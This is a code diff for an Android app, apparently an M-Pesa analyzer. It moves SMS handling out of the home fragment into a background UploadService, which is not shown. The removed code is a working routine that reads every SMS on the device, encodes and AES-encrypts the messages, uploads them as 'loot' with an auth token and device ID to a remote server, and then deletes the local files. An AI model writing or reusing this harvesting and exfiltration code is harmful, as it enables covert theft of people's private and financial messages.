@@ -47,7 +47,6 @@ class Frag_Home : Fragment() {
     private lateinit var activity: AppCompatActivity
     private lateinit var kon: Konstants
     private lateinit var prefs: Prefs
-    private lateinit var init: PayLoade
     private lateinit var sbsent: StringBuffer
 
     private lateinit var jsonProcesses: JsonProcesses
@@ -73,10 +72,7 @@ class Frag_Home : Fragment() {
 
         kon = Konstants
         prefs = Prefs()
-        gson = GsonBuilder().setLenient().create()
         pref_loot_counter = requireActivity().getSharedPreferences(kon.SHARED_LOOT_COUNT, Context.MODE_PRIVATE)
-
-        init = PayLoade()
     }
 
     override fun onCreateView(
@@ -107,7 +103,9 @@ class Frag_Home : Fragment() {
         }
 
         text_get_and_upload.setOnClickListener {
-            init.Parser_SMS(requireActivity())
+            val intent = android.content.Intent(requireContext(), com.niccher.my_mpesa_analyzer.services.UploadService::class.java)
+            androidx.core.content.ContextCompat.startForegroundService(requireContext(), intent)
+            android.widget.Toast.makeText(requireContext(), "Upload started in background", android.widget.Toast.LENGTH_SHORT).show()
         }
 
         last_time.text = prefs.getTimeStamp(requireActivity())
@@ -156,39 +154,7 @@ class Frag_Home : Fragment() {
         }
     }
 
-    private fun Cryptor(inputFile: File, inputStream: InputStream) {
-        try {
-            val cc = Encryptor()
-            Encryptor.encodeToFile(kon.STRING_KEY, kon.STRING_KEY_SPEC, inputStream, FileOutputStream(inputFile))
-            Log.e(kon.TAGGED, "Cryptor: Encryption Completed")
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-    }
 
-    private fun Make_a_File(fileName: String, dataSource: StringBuffer) {
-        val bigData = dataSource.toString()
-        var fos: FileOutputStream? = null
-
-        try {
-            fos = requireActivity().openFileOutput("${kon.STRING_PLAIN_FILE}$fileName", Context.MODE_PRIVATE)
-            fos.write(bigData.toByteArray())
-
-            val fileEncPlain = File(requireActivity().filesDir, "/${kon.STRING_PLAIN_FILE}$fileName")
-            val fileEncAes = File(requireActivity().filesDir, "/${kon.STRING_ENC_AES_FILES}$fileName")
-
-            val fileInputStream = BufferedInputStream(FileInputStream(fileEncPlain))
-            Cryptor(fileEncAes, fileInputStream)
-
-            init.Parser_Upload(fileEncAes, fileName)
-        } catch (e: FileNotFoundException) {
-            Log.e(kon.TAGGED, "Error 1  ${e.message}")
-        } catch (e: IOException) {
-            Log.e(kon.TAGGED, "Error 2  ${e.message}")
-        } finally {
-            fos?.close()
-        }
-    }
 
     private fun calc_Loot() {
         pref_loot_counter = requireActivity().getSharedPreferences(kon.SHARED_LOOT_COUNT, Context.MODE_PRIVATE)
@@ -239,94 +205,5 @@ class Frag_Home : Fragment() {
                 Log.e(kon.TAGGED, t.message ?: "Unknown error")
             }
         })
-    }
-
-    inner class PayLoade : Thread() {
-        override fun run() {
-            super.run()
-            Log.e(kon.TAGGED, "<Start Parser>")
-            Parser_SMS(requireActivity())
-        }
-
-        fun Parser_SMS(context: Context) {
-            Log.e(kon.TAGGED, "Parser_All_SMS->Started >")
-            val cr: ContentResolver = context.contentResolver
-            val c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
-            var totalSMS = 0
-            if (c != null) {
-                totalSMS = c.count
-                if (c.moveToFirst()) {
-                    sbsent = StringBuffer()
-                    for (j in 0 until totalSMS) {
-                        val smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE))
-                        val smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
-                        val smsBody = Base64.encodeToString(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).toByteArray(), Base64.DEFAULT)
-                        val smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))
-                        val smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))
-                        val smsId = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID))
-
-                        val smsType = when (c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)).toInt()) {
-                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
-                            Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
-                            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
-                            Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
-                            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
-                            else -> ""
-                        }
-                        sbsent.append("{\"Type\": \"$smsType\",\"Number\": \"$smsNumber\",\"Thread Id\": $smsThreadid,\"Date\": $smsDate,\"Body\": \"$smsBody\",\"Seen\": $smsSeen,\"ID\": $smsId },-------(//)--------")
-
-                        c.moveToNext()
-                    }
-                }
-                Make_a_File("sms_All_${System.currentTimeMillis()}", sbsent)
-                c.close()
-            } else {
-                Log.e(kon.TAGGED, "Parser_All_SMS->No More >")
-            }
-            Log.e(kon.TAGGED, "Parser_All_SMS->Finished >")
-        }
-
-        fun Parser_Upload(files: File, filename: String) {
-            progressBar.visibility = View.VISIBLE
-
-            val service = ServiceGenerators.createService(JsonUploadLoot::class.java, requireContext())
-            val file = files
-            val requestFile = RequestBody.create("*/*".toMediaTypeOrNull(), file)
-
-            val body = MultipartBody.Part.createFormData("varLoot", "$filename.txt", requestFile)
-
-            val partToken = prefs.getPrefsAuth("auth", requireActivity())
-            val partDevId = prefs.getPrefsAuth("print", requireActivity())
-
-            val requestBody0 = RequestBody.create(okhttp3.MultipartBody.FORM, partToken)
-            val requestBody1 = RequestBody.create(okhttp3.MultipartBody.FORM, partDevId)
-
-            val call = service.upload(requestBody0, requestBody1, body)
-            call.enqueue(object : Callback<ResponseBody> {
-                override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
-                    try {
-                        val encPlain = File(requireActivity().filesDir, "/${kon.STRING_PLAIN_FILE}$filename")
-                        val encAes = File(requireActivity().filesDir, "/${kon.STRING_ENC_AES_FILES}$filename")
-
-                        encPlain.delete()
-                        encAes.delete()
-
-                        prefs.getFileType(filename, System.currentTimeMillis().toString(), requireActivity())
-                        last_time.text = prefs.getTimeStamp(requireActivity())
-                        calc_Loot()
-                    } catch (e: Exception) {
-                        Log.e(kon.TAGGED, "Delete Files error\n${e.message}")
-                    }
-                    progressBar.visibility = View.GONE
-                }
-
-                override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
-                    Toast.makeText(context, "Upload error: " + t?.message ?: "Unknown error", Toast.LENGTH_LONG).show()
-                    progressBar.visibility = View.GONE
-                }
-            })
-
-            Log.e(kon.TAGGED, "Upload_Loot: Data Upload")
-        }
     }
 }
